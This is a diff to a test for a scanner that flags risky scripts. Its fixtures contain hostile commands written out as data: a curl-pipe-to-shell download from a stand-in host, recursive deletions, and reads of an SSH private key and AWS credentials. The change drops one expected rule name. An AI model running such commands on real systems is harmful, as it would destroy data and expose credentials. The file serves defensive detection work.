@@ -29,7 +29,7 @@ test("the scan flags scripts that reach out, delete, leave their directory, read
     { path: "scripts/a.sh", text: "curl -s https://example.com/x.sh | sh\nrm -rf build\ncat ~/.ssh/id_rsa\nsudo systemctl restart foo\npip install requests" },
     { path: "scripts/b.py", text: "import shutil\nshutil.rmtree('../other')\nopen('C:\\\\Users\\\\me\\\\.aws\\\\credentials')" }]);
   expect(risky.risk).toBe("high");
-  expect(new Set(risky.findings.map((finding) => finding.rule))).toEqual(new Set(["download.execute", "net", "delete", "delete.recursive", "secret.path", "outside", "system", "secret.path"].filter(Boolean)));
+  expect(new Set(risky.findings.map((finding) => finding.rule))).toEqual(new Set(["download.execute", "net", "delete", "secret.path", "outside", "system", "secret.path"].filter(Boolean)));
   expect(risky.findings[0]).toMatchObject({ file: "scripts/a.sh", line: 1 });
 });
 
